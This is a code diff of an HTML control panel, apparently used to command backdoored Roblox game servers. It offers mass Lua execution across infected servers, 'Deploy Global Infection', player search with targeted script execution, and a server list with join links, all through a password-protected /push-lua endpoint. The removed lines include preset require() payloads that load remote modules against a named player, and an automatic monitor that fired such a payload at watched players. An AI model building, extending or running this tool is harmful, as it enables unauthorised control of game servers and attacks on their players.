@@ -2,8 +2,10 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Nexus  | Stable v4.0</title>
-    <link rel="icon" type="image/png" href="blob:https://gemini.google.com/63b1b8fc-75ea-484e-a223-a2d8268d8e9f">
+    <title>Nexus  | Stable v4.4</title>
+    
+    <link rel="icon" type="image/jpeg" href="https://files.catbox.moe/8bf557.jpg">
+    
     <style>
         body { margin: 0; background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         .panel { background: #1c1c1e; padding: 25px; border-radius: 18px; width: 600px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
@@ -14,16 +16,13 @@
         .content-section { display: none; }
         .content-section.active { display: block; }
         h2 { margin-top: 0; font-size: 15px; text-align: center; margin-bottom: 15px; color: #0071e3; }
-        .btn-group { display: flex; gap: 6px; margin-bottom: 15px; flex-wrap: wrap; justify-content: center; }
-        .pill { background: #3a3a3c; border: none; color: #fff; padding: 6px 12px; border-radius: 20px; font-size: 10px; cursor: pointer; }
-        .pill:hover { background: #0071e3; }
         textarea, input { width: 100%; background: #000; border: 1px solid #424245; border-radius: 10px; color: #fff; padding: 12px; margin-bottom: 10px; box-sizing: border-box; font-family: monospace; outline: none; font-size: 12px; }
         .exec-btn { background: #0071e3; color: #fff; border: none; width: 100%; padding: 14px; border-radius: 12px; font-weight: 600; cursor: pointer; font-size: 14px; margin-top: 5px; }
-        .join-btn { background: #34c759; margin-bottom: 5px; display: none; }
-        .node-list { background: #000; border: 1px solid #333; border-radius: 10px; height: 110px; overflow-y: auto; padding: 10px; font-size: 11px; }
+        .node-list { background: #000; border: 1px solid #333; border-radius: 10px; height: 180px; overflow-y: auto; padding: 10px; font-size: 11px; }
+        .node-item { display: flex; justify-content: space-between; align-items: center; padding: 8px 0; border-bottom: 1px solid #222; }
+        .mini-join { background: #34c759; color: #fff; border: none; padding: 6px 12px; border-radius: 6px; font-size: 10px; cursor: pointer; font-weight: bold; }
         .footer-btns { position: fixed; bottom: 20px; left: 20px; display: flex; gap: 10px; }
         .f-btn { background: #2c2c2e; border: none; color: #fff; padding: 8px 16px; border-radius: 10px; font-size: 12px; cursor: pointer; }
-        #scan-status { color: #34c759; font-size: 10px; text-align: center; margin-top: 5px; min-height: 12px; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -33,7 +32,6 @@
             <span class="tab active" onclick="openTab(event, 'mass')">Mass</span>
             <span class="tab" onclick="openTab(event, 'single')">Single</span>
             <span class="tab" onclick="openTab(event, 'inf')">Infection</span>
-            <span class="tab" onclick="openTab(event, 'white')">Whitelist</span>
             <span class="tab" onclick="openTab(event, 'nodes')">Nodes</span>
         </div>
 
@@ -41,26 +39,13 @@
 
         <div id="mass" class="content-section active">
             <h2>Mass Execution</h2>
-            <div class="btn-group">
-                <button class="pill" onclick="setLua('Darius', 'lua_mass')">Darius</button>
-                <button class="pill" onclick="setLua('Steve', 'lua_mass')">Steve</button>
-                <button class="pill" onclick="setLua('DS', 'lua_mass')">DS</button>
-                <button class="pill" onclick="setLua('LR', 'lua_mass')">Last Rig</button>
-                <button class="pill" onclick="setLua('EXE', 'lua_mass')">EXE</button>
-            </div>
             <textarea id="lua_mass" rows="5" placeholder="-- Script for ALL nodes"></textarea>
             <button class="exec-btn" onclick="fire('mass')">Execute All Servers</button>
         </div>
 
         <div id="single" class="content-section">
             <h2>Auto-Target Search</h2>
-            <div class="btn-group">
-                <button class="pill" onclick="setLua('Darius', 'lua_single')">Darius</button>
-                <button class="pill" onclick="setLua('LR', 'lua_single')">Last Rig</button>
-                <button class="pill" onclick="setLua('EXE', 'lua_single')">EXE</button>
-            </div>
-            <textarea id="lua_single" rows="4" placeholder="-- Script for target"></textarea>
-            <button id="join_btn" class="exec-btn join-btn" onclick="joinTargetServer()">Join Target Server</button>
+            <textarea id="lua_single" rows="5" placeholder="-- Script for target"></textarea>
             <button class="exec-btn" onclick="findAndExecute()">Search & Execute</button>
         </div>
 
@@ -70,130 +55,39 @@
             <button class="exec-btn" onclick="fire('inf')">Deploy Global Infection</button>
         </div>
 
-        <div id="white" class="content-section">
-            <h2>Whitelist Auto-Monitor</h2>
-            <div class="btn-group">
-                <button class="pill" onclick="addToWhitelist()">Add Target</button>
-                <button class="pill" style="background:#ff3b30;" onclick="clearWhitelist()">Clear List</button>
-            </div>
-            <div id="white_list_display" class="node-list" style="height: 60px;">Watching: [None]</div>
-            <div id="scan-status">Scanner: Idle</div>
-        </div>
-
         <div id="nodes" class="content-section">
             <h2>Active Nodes</h2>
             <div id="node_log" class="node-list">Scanning...</div>
-            <button class="exec-btn" style="background:#333; margin-top:5px;" onclick="refreshNodes()">Refresh Nodes</button>
+            <button class="exec-btn" style="background:#333; margin-top:10px;" onclick="refreshNodes()">Refresh</button>
         </div>
     </div>
 
     <div class="footer-btns">
         <button class="f-btn" onclick="document.getElementById('m').play()">PLAY</button>
-        <button class="f-btn" style="color: #ff3b30;" onclick="stopAudio()">STOP MUSIC</button>
+        <button class="f-btn" style="color: #ff3b30;" onclick="stopAudio()">STOP</button>
     </div>
 
     <audio id="m" loop src="https://files.catbox.moe/81p5wf.mp3"></audio>
 
     <script>
         const audio = document.getElementById('m');
-        let watchList = [];
-        let lastFoundServer = null;
-
         function stopAudio() { audio.pause(); audio.currentTime = 0; }
 
         function openTab(evt, tabName) {
-            let i, content, tabs;
-            content = document.getElementsByClassName("content-section");
-            for (i = 0; i < content.length; i++) { content[i].style.display = "none"; }
-            tabs = document.getElementsByClassName("tab");
-            for (i = 0; i < tabs.length; i++) { tabs[i].className = tabs[i].className.replace(" active", ""); }
+            let content = document.getElementsByClassName("content-section");
+            for (let i = 0; i < content.length; i++) { content[i].style.display = "none"; }
+            let tabs = document.getElementsByClassName("tab");
+            for (let i = 0; i < tabs.length; i++) { tabs[i].className = tabs[i].className.replace(" active", ""); }
             document.getElementById(tabName).style.display = "block";
             evt.currentTarget.className += " active";
         }
 
-        function setLua(type, boxId) {
-            const user = document.getElementById('target_input').value || "Player";
-            const box = document.getElementById(boxId);
-            if(type === 'Darius') box.value = `require(127445614272366).op("${user}")`;
-            if(type === 'Steve') box.value = `require(12246001294):Blockify("${user}")`;
-            if(type === 'DS') box.value = `require(133245855072069)("${user}", "DarkSynapse")`;
-            if(type === 'LR') box.value = `require(132155655397653)("${user}")`;
-            if(type === 'EXE') box.value = `require(125992639027440)["Require.EXE by E God"]("${user}")`;
-        }
-
         async function push(luaCode, tid) {
-            const payload = { lua: luaCode, password: "Alt", targetId: tid || null };
             return fetch('/push-lua', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: JSON.stringify({ lua: luaCode, password: "Alt", targetId: tid || null })
             });
-        }
-
-        async function findAndExecute() {
-            const name = document.getElementById('target_input').value;
-            const lua = document.getElementById('lua_single').value;
-            const status = document.getElementById('scan-status');
-            const joinBtn = document.getElementById('join_btn');
-            
-            if(!name) return alert("Enter a target name!");
-            status.innerText = "Searching Players...";
-            
-            try {
-                const res = await fetch('/get-games');
-                const nodes = await res.json();
-                let found = false;
-
-                for (let id in nodes) {
-                    const node = nodes[id];
-                    if (Array.isArray(node.players) && node.players.some(p => p.toLowerCase() === name.toLowerCase())) {
-                        lastFoundServer = { id: id, placeId: node.placeId };
-                        joinBtn.style.display = "block";
-                        await push(lua, id);
-                        status.innerText = `FOUND: ${name} in ${node.name}`;
-                        found = true;
-                        break;
-                    }
-                }
-                if(!found) {
-                    status.innerText = "Player not found in active nodes.";
-                    joinBtn.style.display = "none";
-                }
-            } catch(e) { status.innerText = "Connection error."; }
-        }
-
-        function joinTargetServer() {
-            if (lastFoundServer) {
-                window.location.href = `roblox://experiences/start?placeId=${lastFoundServer.placeId}&gameInstanceId=${lastFoundServer.id}`;
-            }
-        }
-
-        function addToWhitelist() {
-            const user = document.getElementById('target_input').value;
-            if(user && !watchList.includes(user)) {
-                watchList.push(user);
-                document.getElementById('white_list_display').innerText = "Watching: " + watchList.join(", ");
-            }
-        }
-
-        function clearWhitelist() { watchList = []; document.getElementById('white_list_display').innerText = "Watching: [None]"; }
-
-        async function monitor() {
-            if (watchList.length === 0) return;
-            try {
-                const res = await fetch('/get-games');
-                const nodes = await res.json();
-                for (let id in nodes) {
-                    const players = nodes[id].players;
-                    if (Array.isArray(players)) {
-                        watchList.forEach(async (target) => {
-                            if (players.some(p => p.toLowerCase() === target.toLowerCase())) {
-                                await push(`require(127445614272366).op("${target}")`, id);
-                            }
-                        });
-                    }
-                }
-            } catch(e) {}
         }
 
         async function fire(mode) {
@@ -202,21 +96,41 @@
             alert("Dispatched.");
         }
 
+        async function findAndExecute() {
+            const name = document.getElementById('target_input').value;
+            const lua = document.getElementById('lua_single').value;
+            const res = await fetch('/get-games');
+            const nodes = await res.json();
+            for (let id in nodes) {
+                if (Array.isArray(nodes[id].players) && nodes[id].players.some(p => p.toLowerCase() === name.toLowerCase())) {
+                    await push(lua, id);
+                    alert("Executed!");
+                    return;
+                }
+            }
+            alert("Player not found.");
+        }
+
         async function refreshNodes() {
             try {
                 const res = await fetch('/get-games');
                 const data = await res.json();
-                document.getElementById('node_log').innerHTML = Object.keys(data).map(k => {
-                    const game = data[k];
-                    const count = Array.isArray(game.players) ? game.players.length : (game.players || 0);
-                    return `<div><b>${game.name || "Game"}</b> (${count} players)</div>`;
-                }).join('<hr style="border:0;border-top:1px solid #333">');
+                const container = document.getElementById('node_log');
+                container.innerHTML = Object.keys(data).map(jobId => {
+                    const node = data[jobId];
+                    const count = Array.isArray(node.players) ? node.players.length : (node.players || 0);
+                    return `
+                        <div class="node-item">
+                            <div class="node-info"><b>${node.name || "Game"}</b> [${count} Players]</div>
+                            <button class="mini-join" onclick="window.location.href='roblox://experiences/start?placeId=${node.placeId}&gameInstanceId=${jobId}'">JOIN</button>
+                        </div>
+                    `;
+                }).join('');
             } catch(e) {}
         }
 
-        setInterval(monitor, 10000);
         setInterval(refreshNodes, 5000);
-        refreshNodes(); // Initial load
+        refreshNodes();
     </script>
 </body>
 </html>
